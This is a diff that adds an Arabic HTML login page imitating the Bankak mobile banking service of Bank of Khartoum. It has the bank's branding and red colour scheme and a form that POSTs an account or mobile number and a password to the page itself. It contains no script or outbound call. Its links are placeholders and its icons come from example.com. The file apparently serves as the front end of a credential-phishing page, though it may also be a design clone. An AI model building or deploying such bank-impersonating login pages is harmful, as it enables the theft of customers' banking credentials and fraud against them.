@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #d50000 61%, white 61%);
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            padding: 20px;
+            color: white;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 3em;
+        }
+        .header h2 {
+            margin: 0;
+            font-size: 1.5em;
+        }
+        .header .green {
+            color: green;
+        }
+        .form-container {
+            padding: 55px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            margin: 20px auto;
+            position: relative;
+            background: white;
+        }
+        .red-background {
+            background-color: #d50000;
+            height: 10px;
+            border-radius: 10px;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: -1;
+        }
+        input[type="text"], input[type="password"], button {
+            padding: 12px;
+            margin: 10px 0;
+            width: calc(100% - 22px);
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1.2em;
+        }
+        input[type="password"] {
+            autocomplete: off;
+        }
+        button {
+            background-color: #d50000;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 20px;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #b30000;
+        }
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            font-size: 1em;
+        }
+        .footer-icons {
+            background-color: white;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            display: flex;
+            justify-content: space-around;
+            border-top: 1px solid #ccc;
+        }
+        .footer-icons img {
+            width: 40px;
+        }
+        .footer-icons p {
+            margin: 5px 0 0;
+            font-size: 0.9em;
+        }
+        
+        /* تحسين التنسيق للهواتف */
+        @media (max-width: 600px) {
+            .header h1 {
+                font-size: 2em;
+            }
+            .header h2 {
+                font-size: 1.2em;
+            }
+            .form-container {
+                padding: 30px;
+                margin-top: 20px;
+            }
+            input[type="text"], input[type="password"], button {
+                font-size: 1em;
+                padding: 8px;
+            }
+            .footer-icons {
+                flex-direction: column;
+                padding: 5px;
+            }
+            .footer-icons img {
+                width: 35px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1><span class="green">ب</span>نكك</h1>
+        <h2><span class="green">b</span>ankak</h2>
+    </div>
+
+    <div class="form-container">
+        <div class="red-background"></div>
+        <form method="POST">
+            <input type="text" id="account_number" name="account_number" placeholder="أدخل رقم الحساب أو رقم الموبايل" required>
+            <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" autocomplete="off" required>
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+        <div class="links">
+            <a href="#">تسجيل جديد؟</a>
+            <a href="#">لا تستطيع تسجيل الدخول؟</a>
+        </div>
+    </div>
+
+    <div class="footer-icons">
+        <div class="icon">
+            <img src="https://example.com/icon1.png" alt="بنك الخرطوم">
+            <p>بنك الخرطوم</p>
+        </div>
+        <div>
+            <img src="https://example.com/icon2.png" alt="مواقعنا">
+            <p>مواقعنا</p>
+        </div>
+        <div class="icon">
+            <img src="https://example.com/icon3.png" alt="المساعدة">
+            <p>المساعدة</p>
+        </div>
+        <div class="icon">
+            <img src="https://example.com/icon4.png" alt="فيس بوك">
+            <p>فيس بوك</p>
+        </div>
+    </div>
+</body>
+</html>
+
